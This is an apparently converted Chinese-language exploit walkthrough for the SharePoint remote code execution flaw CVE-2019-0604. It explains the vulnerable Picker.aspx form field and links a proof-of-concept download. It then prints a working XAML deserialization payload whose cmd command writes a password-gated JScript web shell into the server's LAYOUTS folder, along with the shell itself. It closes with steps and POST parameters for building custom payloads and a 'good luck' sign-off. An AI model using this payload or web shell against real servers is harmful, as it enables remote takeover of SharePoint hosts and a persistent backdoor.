<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</p><p>Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</p><h2>二、漏洞影响</h2><p>Microsoft SharePoint Enterprise Server 2016<br />SharePoint Foundation 2013 SP1<br />harePoint Server 2010 SP2<br />SharePoint Server 2019</p><h2>三、复现过程</h2><p>ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</p><p>该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种：</p><p>· Microsoft.SharePoint.WebControls.ItemPickerDialog in             Microsoft.SharePoint.dll<br />· Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog in Microsoft.SharePoint.Portal.dll</p><p>利用第一种 PickerDialogType 类型</p><p>当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 “__” 为开头时(类似于“_dummy”)，</p><p>EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。</p><p>这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。</p><p><strong>完整POST以及具体参数如下：</strong></p><p>URL：/Picker.aspx?PickerDialogType=控件的程序集限定名</p><p>参数： ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=payload</p><p>实际上还需访问Picker.aspx附带的其它参数，测试我不附带其它参数时提交表单是失败的。</p><h2>poc</h2><p>https://download.0-sec.org/download/CVE-2019-0604.zip</p><p><strong>解说k8gege的cve-2019-0604-exp.py</strong></p><p>老实说k8gege的py脚本有点花哨，一大堆的16进制字符串，分成 payload1,2,3, 好坏呀</p><p>python脚本远程post的payload,反序列化之后是一个xml数据体</p><p>&lt;ResourceDictionary<br />xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"<br />xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"<br />xmlns:System="clr-namespace:System;assembly=mscorlib"<br />xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;<br />&lt;ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start"&gt;<br />    &lt;ObjectDataProvider.MethodParameters&gt;<br />        &lt;System:String&gt;cmd&lt;/System:String&gt;<br />        &lt;System:String&gt;/c echo ^&amp;lt;%@ Page Language="Jscript" %^&gt;^&amp;lt;%var pwd="tom";var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf("==="))== pwd) {var code=uastr.Replace(pwd+"===","");eval(code,"unsafe"); };%^&gt; &gt; "%CommonProgramFiles%\\Microsoft Shared\\Web Server Extensions\\15\\TEMPLATE\\LAYOUTS\\ua.aspx" &lt;/System:String&gt;<br />    &lt;/ObjectDataProvider.MethodParameters&gt;<br />&lt;/ObjectDataProvider&gt;<br />&lt;/ResourceDictionary&gt;</p><p><a href="https://github.com/boxhg/CVE-2019-0604/blob/master/Capture3.PNG">Image Pyaload Maker</a></p><p>即远程执行echo命令，向服务器SharePoint的模板layouts目录写了一个up.aspx文件</p><p>cmd /c echo ^&amp;lt;%@ Page Language="Jscript" %^&gt;^&amp;lt;%var pwd="tom";var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf("==="))== pwd) {var code=uastr.Replace(pwd+"===","");eval(code,"unsafe"); };%^&gt; &gt; "%CommonProgramFiles%\\Microsoft Shared\\Web Server Extensions\\15\\TEMPLATE\\LAYOUTS\\ua.aspx" </p><p>生成了一个K8飞刀专用UA一句话木马.asxp，OK，shell到手</p><p>&lt;%@ Page Language="Jscript" %&gt;<br />&lt;%<br />var pwd="tom";<br />var uastr=Request.UserAgent;<br />if (uastr.Substring(0, uastr.IndexOf("==="))== pwd) <br />{<br />    var code=uastr.Replace(pwd+"===","");<br />    eval(code,"unsafe"); <br />};<br />%&gt;</p><h2>结合k8的poc构造我们自己的payload</h2><ul><li>1、 下载编译好的程序，解压运行CVE20190604Forms.exe</li><li>2、在Cmd文本框加输入命令，点击“Update XML”按钮，会将命令合并为xml</li><li>3、点击“EncodeEntity”，程序将xml字符串序列化为对象，并触发执行payload, 序列化后的字符串显示在"payload"文本框中<br />__cp087135009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e60046005600460075002700160......</li><li>4、 "__cp...." 这些字符串就是payload了，复制到 cve-2019-0604-exp.py中，修改替换掉原来k8的payload，</li><li>5、向Picker.aspx提交payload时，需要附带的其它参数，可通过Burp代理工具，获取一下相关的参数，再将payload值传给 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData<br />...<br /><br />values = {<br />    '__REQUESTDIGEST':YOUR_REQUESTDIGEST,<br />    '__EVENTTARGET':'',<br />    '__EVENTARGUMENT':'',<br />    '__spPickerHasReturnValue':'',<br />    '__spPickerReturnValueHolder':'',<br />    '__VIEWSTATE':YOUR_VIEWSTATE,<br />    '__VIEWSTATEGENERATOR':'',<br />    'ctl00$PlaceHolderDialogBodySection$ctl07$queryTextBox':'',<br />    'ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData':**YOUR_PayloadData**,<br />    'ctl00$PlaceHolderDialogBodySection$ctl05$OriginalEntities':'&lt;Entities /&gt;',<br />    'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityKey':'',<br />    'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityDisplayText':'',<br />    'ctl00$PlaceHolderDialogBodySection$ctl05$downlevelTextBox':'&amp;#160;',<br />    '__CALLBACKID':'ctl00$PlaceHolderDialogBodySection$ctl07',<br />    '__CALLBACKPARAM':';#;#11;#;#;#',<br />    '__EVENTVALIDATION':YOUR_EVENTVALIDATION<br />}<br /><br />data = urllib.urlencode(values)<br /><br />...</li><li>6、运行py脚本, good luck!!!</li></ul><h2>参考链接</h2><p>https://github.com/boxhg/CVE-2019-0604/</p></body></html>